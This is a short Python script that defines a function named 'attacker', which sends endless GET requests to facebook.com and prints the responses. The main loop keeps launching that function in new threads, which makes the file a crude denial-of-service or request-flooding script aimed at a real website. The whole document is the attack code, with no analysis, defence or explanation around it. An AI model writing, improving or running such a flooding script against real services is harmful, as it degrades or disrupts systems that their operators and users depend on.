import requests
import thread6
def attacker():
    while True:
        s = requests.Session()
        r  = s.get("https://facebook.com")
        print(r.text)
while True:
 thread6.run_threaded(attacker)
